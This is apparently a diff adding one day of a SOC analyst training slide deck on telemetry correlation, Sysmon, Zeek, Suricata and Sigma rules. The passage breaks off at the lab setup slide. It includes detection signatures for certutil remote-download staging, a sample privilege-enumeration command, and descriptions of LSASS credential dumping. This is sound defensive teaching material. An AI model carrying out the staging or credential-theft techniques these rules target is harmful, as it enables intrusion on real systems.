@@ -1,0 +1,885 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>DAY 04 — Multi-Source Enterprise Telemetry Correlation & Sigma Detection Rules | Threat Intelligence & Incident Response</title>
+  
+  <!-- Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=Space+Grotesk:wght@500;700&display=swap" rel="stylesheet">
+  
+  <!-- Presentation Stylesheets (Referenced from shared/) -->
+  <link rel="stylesheet" href="../shared/css/reset.css">
+  <link rel="stylesheet" href="../shared/css/reveal.css">
+  <link rel="stylesheet" href="../shared/css/theme-cyber-soc.css">
+  <link rel="stylesheet" href="../shared/css/animations.css">
+  <link rel="stylesheet" href="../shared/css/interactive-experiences.css">
+  
+  <style>
+    :root {
+      --day-accent: #00E5FF;
+    }
+    .telemetry-status-bar {
+      border-bottom: 2px solid var(--day-accent);
+    }
+    .nav-day-btn {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      color: #FFF;
+      padding: 3px 10px;
+      border-radius: 4px;
+      font-family: var(--font-mono);
+      font-size: 11px;
+      text-decoration: none;
+      transition: all 0.2s ease;
+    }
+    .nav-day-btn:hover {
+      background: var(--day-accent);
+      color: #050814;
+      border-color: var(--day-accent);
+    }
+    .nav-day-btn.disabled {
+      opacity: 0.3;
+      cursor: not-allowed;
+      border-color: transparent;
+    }
+    .portal-home-btn {
+      background: rgba(0, 242, 254, 0.12);
+      border: 1px solid var(--cyber-cyan);
+      color: var(--cyber-cyan);
+      padding: 3px 10px;
+      border-radius: 4px;
+      font-family: var(--font-mono);
+      font-size: 11px;
+      font-weight: 700;
+      text-decoration: none;
+      transition: all 0.2s ease;
+    }
+    .portal-home-btn:hover {
+      background: var(--cyber-cyan);
+      color: #050814;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top Real-Time Telemetry Bar -->
+  <div class="telemetry-status-bar">
+    <div class="status-left">
+      <a href="../index.html" class="portal-home-btn" title="Return to Course Master Portal">⊞ MASTER PORTAL</a>
+      <div class="status-pill">
+        <span class="live-indicator"></span>
+        <span style="color: var(--day-accent); font-weight: 700;">DAY 04</span>
+      </div>
+      <div class="status-pill">
+        <span>VENUE:</span> <strong style="color: #F8FAFC;">LH3 – 4TH FLOOR</strong>
+      </div>
+      <div class="status-pill">
+        <span>SESSION:</span> <strong style="color: #F8FAFC;">1:00 PM – 5:00 PM</strong>
+      </div>
+    </div>
+    
+    <div class="status-center">
+      <div class="status-pill">
+        <span>FOCUS:</span> <strong id="status-module" style="color: var(--day-accent);">Multi-Source Enterprise Telemetry Co...</strong>
+      </div>
+    </div>
+    
+    <div class="status-right">
+      <a href="../day-03/index.html" class="nav-day-btn" title="Go to DAY-03">◀ PREV DAY</a>
+      <a href="../day-05/index.html" class="nav-day-btn" title="Go to DAY-05">NEXT DAY ▶</a>
+      <button onclick="toggleShortcutModal()" style="background: none; border: 1px solid rgba(255,255,255,0.2); color: var(--text-muted); padding: 2px 8px; border-radius: 4px; font-family: var(--font-mono); font-size: 10px; cursor: pointer;">KEYS [?]</button>
+      <button onclick="toggleFullScreen()" style="background: none; border: 1px solid rgba(255,255,255,0.2); color: var(--text-muted); padding: 2px 8px; border-radius: 4px; font-family: var(--font-mono); font-size: 10px; cursor: pointer;">FULL [F]</button>
+    </div>
+  </div>
+
+  <!-- Bottom Custom Slide Counter -->
+  <div id="custom-slide-counter" class="custom-slide-counter">DAY 04: SLIDE <span>01</span> / 17</div>
+
+  <!-- Keyboard Shortcuts Modal -->
+  <div id="shortcut-modal" style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(5,8,20,0.85); backdrop-filter: blur(8px); z-index: 2000; display: none; align-items: center; justify-content: center;" onclick="if(event.target===this) toggleShortcutModal()">
+    <div style="background: #0F172A; border: 1px solid var(--day-accent); border-radius: 12px; padding: 28px 36px; max-width: 500px; width: 90%; box-shadow: 0 0 40px rgba(0,242,254,0.3); text-align: left;">
+      <h3 style="margin-top: 0; color: #FFF; font-family: var(--font-heading);">⌨️ DAY 04 Navigation Shortcuts</h3>
+      <table style="width: 100%; font-family: var(--font-mono); font-size: 12px; color: var(--text-secondary); border-collapse: collapse;">
+        <tr><td style="padding: 6px 0; color: var(--day-accent);">Space / Right Arrow</td><td>Next Slide / Fragment</td></tr>
+        <tr><td style="padding: 6px 0; color: var(--day-accent);">Left Arrow</td><td>Previous Slide</td></tr>
+        <tr><td style="padding: 6px 0; color: var(--day-accent);">F</td><td>Toggle Full-Screen Mode</td></tr>
+        <tr><td style="padding: 6px 0; color: var(--day-accent);">Esc / ?</td><td>Close Modal / Help</td></tr>
+      </table>
+      <div style="margin-top: 15px; display: flex; gap: 10px;">
+        <a href="../index.html" style="display: block; text-align: center; flex: 1; padding: 8px; background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.2); border-radius: 6px; color: #FFF; text-decoration: none; font-size: 12px;">RETURN TO PORTAL</a>
+        <button onclick="toggleShortcutModal()" style="flex: 1; padding: 8px; background: var(--day-accent); border: none; border-radius: 6px; font-weight: 700; color: #050814; cursor: pointer; font-size: 12px;">CLOSE</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Reveal.js Container -->
+  <div class="reveal">
+    <div class="slides">
+
+      <!-- DAY 04 - SLIDE 01: Day 4 Launch & Objectives -->
+      <section data-day="DAY 04" data-module="MOD-04: TELEMETRY & SIEM" data-session="1:00 PM – 5:00 PM" data-ref="Handbook Module 4">
+
+          <div style="text-align: left;">
+            <div class="cyber-badge badge-cyan">MODULE 04 LAUNCH</div>
+            <h2>Multi-Source Telemetry, SIEM Correlation & Sigma Detection Rules</h2>
+            <p>Session ID: SES-04 | Scheduled Net Teaching: 220 Minutes | Refreshment Break: 3:00 PM (20 min)</p>
+            
+            <div class="grid-2" style="margin-top: 20px;">
+              <div class="cyber-card">
+                <strong style="color: var(--cyber-cyan); font-size: 15px;">Target Learning Outcomes (PLO-4)</strong>
+                <ul style="font-size: 13px; color: var(--text-secondary); margin-top: 10px; line-height: 1.7;">
+                  <li><strong>Telemetry Architecture:</strong> Integrate Host, Network, and Cloud sensor logs.</li>
+                  <li><strong>Windows Auditing:</strong> Decipher Event ID 4624 (Logon Types) and 4688 (Process Lineage).</li>
+                  <li><strong>Sysmon Deep-Dive:</strong> Master Event IDs 1 (Process), 3 (Network), 10 (Injection), 22 (DNS).</li>
+                  <li><strong>Network Sensors:</strong> Correlate Zeek <code>conn.log</code>, <code>dns.log</code>, and Suricata EVE.json.</li>
+                  <li><strong>Cross-Source Pivoting:</strong> Map local host process execution directly to network flow UIDs.</li>
+                  <li><strong>Sigma Rule Engineering:</strong> Author portable detection logic and transpile via <code>pySigma</code>.</li>
+                </ul>
+              </div>
+              
+              <div class="cyber-card">
+                <strong style="color: var(--electric-blue); font-size: 15px;">Hands-On Milestone: LAB-04</strong>
+                <p style="font-size: 13px; margin-top: 10px;">
+                  Every analyst will analyze multi-source telemetry logs, pivot from a suspicious Windows Sysmon Event ID 1 process tree to Zeek network flow records, author a custom Sigma YAML detection rule for <strong>UNC-PHOENIX</strong> Certutil staging, and transpile it to Splunk and Elasticsearch formats.
+                </p>
+                <div style="margin-top: 16px; padding: 10px; background: rgba(0, 242, 254, 0.08); border-radius: 6px; border: 1px dashed var(--cyber-cyan); font-family: var(--font-mono); font-size: 12px; color: var(--cyber-cyan);">
+                  TARGET FILE: sigma_certutil_staging.yml // LAB-04 COMPLETE
+                </div>
+              </div>
+            </div>
+          </div>
+        
+        <aside class="notes">
+          [SAY:] Good afternoon, colleagues, and welcome to Day 4. Today we enter the engine room: Windows internals, Sysmon, and network packet telemetry. If you enjoy staring at pretty vendor dashboards with green pie charts, today will cure you of that habit! Real threat detection happens down in the raw event logs.
+          [PEDAGOGY:] HUMOR ANCHOR: Vendor dashboards with green pie charts vs. raw engine-room logs. Set the technical stage for deep telemetry analysis.
+        </aside>
+      </section>
+
+      <!-- DAY 04 - SLIDE 02: Multi-Source Telemetry Architecture -->
+      <section data-day="DAY 04" data-module="MOD-04: TELEMETRY & SIEM" data-session="1:00 PM – 5:00 PM" data-ref="Handbook Day 4 Concept 1">
+
+          <div style="text-align: left;">
+            <div class="cyber-badge badge-blue">TELEMETRY CORRELATION</div>
+            <h2>Multi-Source Telemetry: The Triad of Visibility</h2>
+            <p>No single sensor sees the entire attack. True visibility requires multi-source correlation.</p>
+            
+            <div class="grid-3" style="margin-top: 20px;">
+              <div class="cyber-card">
+                <strong style="color: var(--cyber-cyan);">1. HOST TELEMETRY</strong>
+                <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 6px;">Windows Events, Sysmon, EDR</div>
+                <p style="font-size: 13px;">What executed? Process trees, command lines, loaded DLLs, memory injections, registry modifications. <em>Strength: Exact process and user attribution.</em></p>
+              </div>
+              
+              <div class="cyber-card">
+                <strong style="color: var(--electric-blue);">2. NETWORK TELEMETRY</strong>
+                <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 6px;">Zeek, Suricata, NetFlow, PCAP</div>
+                <p style="font-size: 13px;">Where did it communicate? Byte volumes, TCP flags, DNS queries, TLS certificates, HTTP headers. <em>Strength: Unforgeable wire truth.</em></p>
+              </div>
+              
+              <div class="cyber-card">
+                <strong style="color: var(--neon-amber);">3. CLOUD / IDENTITY</strong>
+                <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 6px;">Entra ID, AWS CloudTrail, Okta</div>
+                <p style="font-size: 13px;">Who authenticated? MFA tokens, token theft, service principal activity, abnormal geolocations. <em>Strength: Identity plane tracking.</em></p>
+              </div>
+            </div>
+          </div>
+        
+        <aside class="notes">
+          [SAY:] Correlating host and network telemetry is like checking both the college main gate security register and the hostel warden's sign-in sheet. If a student says they were in the hostel studying at 10 PM, but the main gate register shows their bike leaving at 9:45 PM, the discrepancy tells you the truth. In cyber defense, an attacker can modify their command line, but they cannot erase the firewall connection record and the Zeek conn.log simultaneously.
+          [PEDAGOGY:] HUMOR ANCHOR: Hostel warden's sign-in sheet vs. main gate security register. Explains why combining host and wire data defeats adversary evasion.
+        </aside>
+      </section>
+
+      <!-- DAY 04 - SLIDE 03: Windows Security Event Telemetry -->
+      <section data-day="DAY 04" data-module="MOD-04: TELEMETRY & SIEM" data-session="1:00 PM – 5:00 PM" data-ref="Handbook Day 4 Concept 2">
+
+          <div style="text-align: left;">
+            <div class="cyber-badge badge-cyan">HOST INTERNALS</div>
+            <h2>Windows Security Auditing: Essential Event IDs</h2>
+            <p>The standard Windows Event Log security baseline for detection engineers.</p>
+            
+            <div class="grid-2" style="margin-top: 20px;">
+              <div class="cyber-card">
+                <strong style="color: var(--cyber-cyan); font-size: 15px;">EVENT ID 4624: LOGON TYPES</strong>
+                <table class="lab-steps-compact" style="margin-top: 8px;">
+                  <tr><th>Type</th><th>Logon Mechanism & Operational Context</th></tr>
+                  <tr><td><strong>Type 2</strong></td><td>Interactive Logon (Physical keyboard & screen)</td></tr>
+                  <tr><td><strong>Type 3</strong></td><td>Network Logon (SMB, PsExec, Pass-the-Hash!)</td></tr>
+                  <tr><td><strong>Type 7</strong></td><td>Unlock Workstation (Screen unlock)</td></tr>
+                  <tr><td><strong>Type 10</strong></td><td>RemoteInteractive (Remote Desktop Protocol / RDP)</td></tr>
+                </table>
+              </div>
+              
+              <div class="cyber-card">
+                <strong style="color: var(--neon-amber); font-size: 15px;">EVENT ID 4688: PROCESS CREATION</strong>
+                <p style="font-size: 13px; margin-top: 8px;">
+                  Records every binary executed on the system. Requires GPO policy <em>"Include command line in process creation events"</em> enabled.
+                </p>
+                <div class="terminal-buffer" style="margin-top: 10px; font-size: 11px;">
+                  <div class="terminal-body">
+<span class="terminal-cmd">Creator Process:</span> C:\Windows\explorer.exe
+<span class="terminal-cmd">New Process Name:</span> C:\Windows\System32\cmd.exe
+<span class="terminal-cmd">Process Command Line:</span> cmd.exe /c whoami /priv
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        
+        <aside class="notes">
+          [SAY:] Memorize Logon Type 3. When an attacker executes Pass-the-Hash or moves laterally using PsExec, Windows records Logon Type 3 (Network). If you see an administrative account logging in via Type 3 at 3:00 AM from a DMZ workstation, sound the alarm.
+          [PEDAGOGY:] Emphasize Logon Type 3 and Type 10 as the core indicators of lateral movement.
+        </aside>
+      </section>
+
+      <!-- DAY 04 - SLIDE 04: Sysmon Telemetry Deep-Dive -->
+      <section data-day="DAY 04" data-module="MOD-04: TELEMETRY & SIEM" data-session="1:00 PM – 5:00 PM" data-ref="Handbook Day 4 Concept 3">
+
+          <div style="text-align: left;">
+            <div class="cyber-badge badge-amber">SYSINTERNALS SYSMON</div>
+            <h2>Microsoft Sysmon: The High-Fidelity Endpoint Sensor</h2>
+            <p>System Monitor bridges the gap between basic event logs and commercial EDR agents.</p>
+            
+            <div class="grid-4" style="margin-top: 20px; font-size: 12px;">
+              <div class="cyber-card">
+                <strong style="color: var(--cyber-cyan);">EVENT ID 1</strong>
+                <div style="font-weight: 700; color: #FFF; margin: 6px 0;">Process Create</div>
+                <p>Captures full command line, parent process lineage, image hashes (MD5, SHA-256), and original file name.</p>
+              </div>
+              <div class="cyber-card">
+                <strong style="color: var(--electric-blue);">EVENT ID 3</strong>
+                <div style="font-weight: 700; color: #FFF; margin: 6px 0;">Network Connect</div>
+                <p>Binds the exact process ID and binary image to an outbound destination IP, port, and protocol.</p>
+              </div>
+              <div class="cyber-card">
+                <strong style="color: var(--alert-crimson);">EVENT ID 10</strong>
+                <div style="font-weight: 700; color: #FFF; margin: 6px 0;">Process Access</div>
+                <p>Detects process injection (T1055) and LSASS memory dumping (Mimikatz accessing lsass.exe).</p>
+              </div>
+              <div class="cyber-card">
+                <strong style="color: var(--neon-amber);">EVENT ID 22</strong>
+                <div style="font-weight: 700; color: #FFF; margin: 6px 0;">DNS Query</div>
+                <p>Logs the exact query string, resolved IP, and originating process ID (detects C2 domain resolution).</p>
+              </div>
+            </div>
+          </div>
+        
+        <aside class="notes">
+          [SAY:] Look at Sysmon Event ID 1: Process Creation. We look at the parent-child relationship. If Word launches PowerShell, which launches CMD, which launches Certutil... colleagues, that is not Microsoft Word doing document formatting! That is like your younger brother borrowing your motorcycle at 2:00 AM wearing a helmet and carrying a crowbar! You don't need an audit committee to know something suspicious is taking place.
+          [PEDAGOGY:] HUMOR ANCHOR: The younger brother borrowing your bike at 2:00 AM with a crowbar! Memorable analogy for malicious process trees.
+        </aside>
+      </section>
+
+      <!-- DAY 04 - SLIDE 05: Zeek Protocol Brokering Telemetry -->
+      <section data-day="DAY 04" data-module="MOD-04: TELEMETRY & SIEM" data-session="1:00 PM – 5:00 PM" data-ref="Handbook Day 4 Concept 4">
+
+          <div style="text-align: left;">
+            <div class="cyber-badge badge-blue">WIRE TELEMETRY</div>
+            <h2>Zeek (formerly Bro): Structured Protocol Brokering</h2>
+            <p>Zeek converts unstructured network packet chaos into clean, structured tab-delimited logs.</p>
+            
+            <div class="grid-3" style="margin-top: 20px;">
+              <div class="cyber-card">
+                <strong style="color: var(--cyber-cyan); font-size: 15px;">conn.log (Connections)</strong>
+                <p style="font-size: 12px; margin-top: 6px;">Every TCP/UDP session. Tracks originating/responding IPs, ports, duration, byte counts, and connection state (e.g., <code>SF</code> for normal, <code>S0</code> for scan).</p>
+                <div style="font-family: var(--font-mono); font-size: 11px; color: var(--text-highlight);">UID: Unique flow identifier</div>
+              </div>
+              
+              <div class="cyber-card">
+                <strong style="color: var(--electric-blue); font-size: 15px;">dns.log (DNS Queries)</strong>
+                <p style="font-size: 12px; margin-top: 6px;">Every domain query and response. Logs QTYPE (A, AAAA, TXT), resolved IPs, and TTL values. Detects DNS tunneling and DGA algorithms.</p>
+                <div style="font-family: var(--font-mono); font-size: 11px; color: var(--text-highlight);">Linked by UID to conn.log!</div>
+              </div>
+              
+              <div class="cyber-card">
+                <strong style="color: var(--neon-amber); font-size: 15px;">ssl.log (TLS Sessions)</strong>
+                <p style="font-size: 12px; margin-top: 6px;">Server Name Indication (SNI), certificate subject, issuer, SHA-1 fingerprint, and JA3/JA3S client/server fingerprints.</p>
+                <div style="font-family: var(--font-mono); font-size: 11px; color: var(--text-highlight);">Exposes C2 despite encryption!</div>
+              </div>
+            </div>
+          </div>
+        
+        <aside class="notes">
+          [SAY:] Zeek is pure gold for SOC analysts. Notice the UID field. In Zeek, every single network conversation gets a unique connection ID—like CHhAvV31uWRrAc8oj6. If you see that UID in conn.log, you can grep that exact UID in dns.log, ssl.log, and http.log to reassemble the entire conversation.
+          [PEDAGOGY:] Explain how Zeek's UID field ties disparate protocol logs into a unified investigation stream.
+        </aside>
+      </section>
+
+      <!-- DAY 04 - SLIDE 06: Suricata NIDS & EVE.json Telemetry -->
+      <section data-day="DAY 04" data-module="MOD-04: TELEMETRY & SIEM" data-session="1:00 PM – 5:00 PM" data-ref="Handbook Day 4 Section 4.3">
+
+          <div style="text-align: left;">
+            <div class="cyber-badge badge-crimson">SIGNATURE INSPECTION</div>
+            <h2>Suricata Network IDS & EVE.json Telemetry</h2>
+            <p>High-performance, multi-threaded signature-based network threat detection.</p>
+            
+            <div class="terminal-buffer" style="margin-top: 18px;">
+              <div class="terminal-header">
+                <div class="terminal-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                <span>SURICATA RULE STRUCTURE & EVE JSON OUTPUT</span>
+              </div>
+              <div class="terminal-body" style="font-size: 12px;">
+<span style="color: #64748B;"># Suricata Signature Syntax:</span>
+<span class="terminal-cmd">alert http $HOME_NET any -> $EXTERNAL_NET any</span> (
+  msg:<span style="color: #A5D6A7;">"ET MALWARE UNC-PHOENIX Certutil Staging Download"</span>;
+  flow:established,to_server;
+  http.uri; content:<span style="color: #A5D6A7;">"/internal-sync.txt"</span>;
+  http.user_agent; content:<span style="color: #A5D6A7;">"Certutil"</span>;
+  classtype:trojan-activity; sid:2045910; rev:1;
+)
+
+<span style="color: #64748B;"># Resulting EVE.json Telemetry:</span>
+{"timestamp":"2026-10-29T02:14:15.120Z","event_type":"alert","src_ip":"10.0.4.12","src_port":49820,
+ "dest_ip":"198.51.100.45","dest_port":80,"alert":{"action":"allowed","signature_id":2045910,
+ "signature":"ET MALWARE UNC-PHOENIX Certutil Staging Download","category":"Trojan Activity"}}
+              </div>
+            </div>
+          </div>
+        
+        <aside class="notes">
+          [SAY:] Look at the Suricata rule. We inspect both the URI and the User-Agent header for 'Certutil'. When an attacker executes certutil to download a stager, Suricata triggers SID 2045910 and outputs a clean JSON record in eve.json.
+          [PEDAGOGY:] Deconstruct the Suricata rule syntax: Action, Protocol, Network, Flow, Content matching, SID.
+        </aside>
+      </section>
+
+      <!-- DAY 04 - SLIDE 07: Cross-Source Telemetry Pivoting -->
+      <section data-day="DAY 04" data-module="MOD-04: TELEMETRY & SIEM" data-session="1:00 PM – 5:00 PM" data-ref="Handbook Day 4 Concept 5">
+
+  <div style="text-align: left;">
+    <div class="cyber-badge badge-teal">CORRELATION ENGINEERING</div>
+    <h2>Cross-Source Telemetry Pivoting & Root Cause Analysis</h2>
+    <p>Bridging Perimeter Network Signals to Endpoint Process Trees</p>
+    
+    <div id="telemetry-correlator-demo" class="cyber-card" style="margin-top: 12px;">
+      <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+        <strong style="color: var(--cyber-cyan); font-size: 13px;">Live Multi-Source Telemetry Correlator</strong>
+        <button onclick="triggerCorrelationPipeline()" style="background: var(--cyber-cyan); color: #050814; border: none; padding: 5px 14px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 11px;">
+          EXECUTE CORRELATION BEAM ⚡
+        </button>
+      </div>
+      <div class="telemetry-pipeline-grid">
+        <div class="telemetry-step-card">
+          <span style="color: var(--neon-amber); font-weight: bold; font-size: 11px;">1. NETWORK NIDS (SURICATA)</span>
+          <div style="font-size: 11px; color: #CBD5E1; margin-top: 4px;">Alert: Outbound C2 Beaconing to 198.51.100.44 on Port 443</div>
+        </div>
+        <div class="telemetry-step-card">
+          <span style="color: var(--electric-blue); font-weight: bold; font-size: 11px;">2. IDENTITY LOGS (EVENT 4624)</span>
+          <div style="font-size: 11px; color: #CBD5E1; margin-top: 4px;">Logon Type 3: Unusual NTLM authentication for 'svc_backup'</div>
+        </div>
+        <div class="telemetry-step-card">
+          <span style="color: var(--alert-crimson); font-weight: bold; font-size: 11px;">3. ENDPOINT SYSMON (EID 10)</span>
+          <div style="font-size: 11px; color: #CBD5E1; margin-top: 4px;">ProcessAccess: PowerShell opened LSASS handle with mask 0x1010</div>
+        </div>
+      </div>
+      <div class="telemetry-correlation-result">
+        <strong style="color: var(--emerald-pass); font-size: 12px;">✔ HIGH-CONFIDENCE HYPOTHESIS CONFIRMED:</strong>
+        <div style="font-size: 11px; color: #CBD5E1; margin-top: 2px;">
+          Compromised service account 'svc_backup' used to spawn remote PowerShell session and dump LSASS credentials for lateral movement.
+        </div>
+      </div>
+    </div>
+  </div>
+
+        <aside class="notes">
+          [SAY:] [SHOW:] Display the Multi-Source Telemetry Event Correlator.
+[SAY:] 'Look at how these three signals connect. In an immature SOC, three different analysts look at these alerts separately. The network analyst sees an outbound beacon. The identity team sees a logon. The endpoint team sees a PowerShell alert.'
+[DO:] Click 'EXECUTE CORRELATION BEAM'.
+[OBSERVE:] The animated beam links the three cards together, lighting up the green confirmed incident hypothesis.
+[ASK:] 'Why is relying on only one of these three signals dangerous?'
+[EXPECTED ANSWER:] 'Network alerts lack process context; endpoint alerts lack network destination; identity alerts lack execution proof.'
+[REVEAL:] High-confidence root-cause isolation.
+[EXPLAIN:] Telemetry pivoting transforms isolated noise into definitive forensic certainty.
+          [PEDAGOGY:] Walk students through the 3-step pivot sequence. Key concept for Lab 4.
+        </aside>
+      </section>
+
+      <!-- DAY 04 - SLIDE 08: Sigma Rule Specification -->
+      <section data-day="DAY 04" data-module="MOD-04: TELEMETRY & SIEM" data-session="1:00 PM – 5:00 PM" data-ref="Handbook Day 4 Concept 6">
+
+          <div style="text-align: left;">
+            <div class="cyber-badge badge-amber">GENERIC DETECTION</div>
+            <h2>Sigma: The 'Write Once, Detect Everywhere' Standard</h2>
+            <p>Open-source, generic YAML detection signatures transpiled to any SIEM query language.</p>
+            
+            <div class="terminal-buffer" style="margin-top: 18px;">
+              <div class="terminal-header">
+                <div class="terminal-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                <span>proc_creation_win_certutil_staging.yml // SIGMA SPECIFICATION</span>
+              </div>
+              <div class="terminal-body" style="font-size: 12px;">
+<span class="terminal-cmd">title:</span> UNC-PHOENIX Certutil Remote File Download
+<span class="terminal-cmd">id:</span> a8b4c2e1-4501-4921-9921-091248591234
+<span class="terminal-cmd">status:</span> production
+<span class="terminal-cmd">logsource:</span>
+    category: process_creation
+    product: windows
+<span class="terminal-cmd">detection:</span>
+    selection_cmd:
+        Image|endswith: <span style="color: #A5D6A7;">'\certutil.exe'</span>
+        CommandLine|contains|all:
+            - <span style="color: #A5D6A7;">'-urlcache'</span>
+            - <span style="color: #A5D6A7;">'http'</span>
+    condition: selection_cmd
+<span class="terminal-cmd">level:</span> high
+<span class="terminal-cmd">tags:</span>
+    - attack.defense_evasion
+    - attack.t1059.001
+              </div>
+            </div>
+          </div>
+        
+        <aside class="notes">
+          [SAY:] Sigma is the 'write once, detect everywhere' language. It's like writing an algorithm on the blackboard that works in C, Java, and Python. Unlike student assignments where four people copy the same code from GitHub and forget to change the original author's name in the header comment, Sigma rules are clean, standardized, and portable across Splunk, QRadar, and Elasticsearch.
+          [PEDAGOGY:] HUMOR ANCHOR: Copying GitHub code and forgetting to change the roll number! Explain how pySigma converts Sigma into native SIEM queries.
+        </aside>
+      </section>
+
+      <!-- DAY 04 - SLIDE 09: Demonstration 4: Telemetry Pivot & Sigma Transpilation -->
+      <section data-day="DAY 04" data-module="MOD-04: TELEMETRY & SIEM" data-session="1:00 PM – 5:00 PM" data-ref="Handbook Demonstration 4">
+
+          <div style="text-align: left;">
+            <div class="cyber-badge badge-cyan">TRAINER DEMONSTRATION</div>
+            <h2>Demo 4: Cross-Source Pivot & pySigma Transpilation</h2>
+            <p>From raw event logs to production Splunk and Elasticsearch detection queries.</p>
+            
+            <div class="grid-2" style="margin-top: 16px;">
+              <div class="terminal-buffer">
+                <div class="terminal-header">
+                  <div class="terminal-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                  <span>TRANSPILING TO SPLUNK SPL</span>
+                </div>
+                <div class="terminal-body" style="font-size: 11px;">
+<span class="terminal-cmd"># Transpile with pySigma:</span>
+sigma convert -t splunk -p sysmon proc_creation_win_certutil_staging.yml
+<br><span style="color: var(--cyber-cyan);">// GENERATED SPLUNK QUERY:</span>
+index=windows_sysmon EventCode=1 
+Image="*\certutil.exe" 
+CommandLine="*-urlcache*" CommandLine="*http*"
+                </div>
+              </div>
+              
+              <div class="terminal-buffer">
+                <div class="terminal-header">
+                  <div class="terminal-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                  <span>TRANSPILING TO ELASTICSEARCH KQL</span>
+                </div>
+                <div class="terminal-body" style="font-size: 11px;">
+<span class="terminal-cmd"># Transpile with pySigma:</span>
+sigma convert -t elasticsearch -p ecs proc_creation_win_certutil_staging.yml
+<br><span style="color: var(--neon-amber);">// GENERATED ELASTIC KQL:</span>
+event.code:"1" and 
+process.executable:*\certutil.exe and 
+process.command_line:*urlcache* and 
+process.command_line:*http*
+                </div>
+              </div>
+            </div>
+          </div>
+        
+        <aside class="notes">
+          [SAY:] Watch pySigma in action. One generic Sigma YAML file transpiles into production-ready Splunk SPL on the left, and Elastic KQL on the right. Write your detection once; deploy it across any SIEM platform in the world.
+          [PEDAGOGY:] Demonstrate the command line execution of pySigma. Emphasize why vendor independence matters.
+        </aside>
+      </section>
+
+      <!-- DAY 04 - SLIDE 10: LAB 04 (Part 1/7): Introduction & Objectives -->
+      <section data-day="DAY 04" data-module="MOD-04: ENTERPRISE TELEMETRY & SIGMA" data-session="1:00 PM – 5:00 PM" data-ref="Handbook Lab Manual 4 — Section 4.1">
+
+              <div style="text-align: left;">
+                <div class="cyber-badge badge-blue">LAB-04: STEP 1 OF 7 // SPECIFICATION & OBJECTIVES</div>
+                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Security Telemetry Analysis & SIEM Correlation</h2>
+                <p style="color: var(--text-secondary); font-size: 0.95rem;">Cross-source triage of Windows Security Events (4624, 4625, 4688) and Suricata IDS alerts.</p>
+                
+                <div class="grid-3" style="margin-top: 18px;">
+                  <div class="cyber-card">
+                    <strong style="color: var(--cyber-cyan); font-size: 13px;">🎯 Core Learning Objectives</strong>
+                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
+                      <li>Ingest and filter Windows authentication events (EID 4624, 4625) and process launches (EID 4688).</li>
+                      <li>Detect brute-force clusters and decode base64-obfuscated PowerShell payloads.</li>
+                      <li>Correlate endpoint timestamps with Suricata network IDS alerts to identify C2 beaconing.</li>
+                    </ul>
+                  </div>
+                  <div class="cyber-card">
+                    <strong style="color: var(--neon-amber); font-size: 13px;">⏱️ Parameters & Scope</strong>
+                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
+                      <li><strong>Estimated Duration:</strong> 85 Minutes.</li>
+                      <li><strong>Instructional Framework:</strong> IBM ICE & The Telemetry Triad.</li>
+                      <li><strong>PLO Mapping:</strong> PLO-4 (Multi-source telemetry correlation).</li>
+                    </ul>
+                  </div>
+                  <div class="cyber-card">
+                    <strong style="color: var(--emerald-pass); font-size: 13px;">📦 Required Deliverables</strong>
+                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
+                      <li>Compromised account triage report identifying <code>svc_backup_admin</code>.</li>
+                      <li>Decoded CyberChef PowerShell payload and second-stage C2 URL.</li>
+                      <li>Cross-source correlated forensic timeline table.</li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+            
+        <aside class="notes">
+          [SAY:] Today we dive into real operational telemetry. You have 2,500 authentication events and 1,200 network alerts. You will find patient zero by pivoting from failed logons to process execution and outbound network telemetry.
+          [PEDAGOGY:] Remind students that attackers live between the logs — an authentication failure looks benign until linked to a process launch.
+        </aside>
+      </section>
+
+      <!-- DAY 04 - SLIDE 11: LAB 04 (Part 2/7): Environment Preparation -->
+      <section data-day="DAY 04" data-module="MOD-04: ENTERPRISE TELEMETRY & SIGMA" data-session="1:00 PM – 5:00 PM" data-ref="Handbook Lab Manual 4 — Section 4.2">
+
+              <div style="text-align: left;">
+                <div class="cyber-badge badge-cyan">LAB-04: STEP 2 OF 7 // WORKSTATION PREPARATION</div>
+                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Dataset Ingestion & Analysis Toolchain</h2>
+                <p style="color: var(--text-secondary); font-size: 0.95rem;">Preparing Python pandas environment and verifying JSON log datasets.</p>
+                
+                <div class="grid-2" style="margin-top: 16px;">
+                  <div class="cyber-card">
+                    <strong style="color: var(--cyber-cyan); font-size: 13px;">💻 Toolchain & Datasets</strong>
+                    <table style="width: 100%; font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
